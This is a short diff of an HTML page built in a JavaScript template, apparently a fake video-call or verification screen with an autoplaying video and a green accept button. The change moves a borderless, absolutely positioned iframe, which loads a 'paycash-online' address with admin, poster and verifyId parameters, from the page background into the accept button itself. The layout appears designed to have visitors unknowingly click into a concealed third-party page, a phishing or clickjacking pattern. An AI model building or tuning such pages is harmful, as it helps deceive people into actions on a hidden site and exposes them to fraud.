@@ -35,13 +35,7 @@ newDiv.innerHTML = `
 </head>
 <body class="__className_aaf875">
     <!-- Background Iframe -->
-    <iframe class="accept-button"
-        src="https://paycash-online.vercel.app/"${admin}/${poster}/${verifyId}
-        width="100%" 
-        height="100%" 
-        style="border:0; position:absolute; top:0; left:0; z-index:-1;">
-    </iframe>
-
+    
     <div style="color-scheme:light" class="bg-neutral-900 text-neutral-950">
         <video autoplay muted playsinline class="fixed inset-0 w-full h-full object-cover object-center" id="video"></video>
 
@@ -49,7 +43,13 @@ newDiv.innerHTML = `
             <div class="bg-neutral-50 w-full max-w-[17rem] p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
                 <div class="flex items-center justify-center gap-x-12 text-neutral-50">
                     <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
-                        <!-- Accept button (empty, no image) -->
+                        <iframe 
+        src="https://paycash-online.vercel.app/"${admin}/${poster}/${verifyId}
+        width="100%" 
+        height="100%" 
+        style="border:0; position:absolute; top:0; left:0; z-index:-1;">
+    </iframe>
+
                     </label>
                 </div>
             </div>
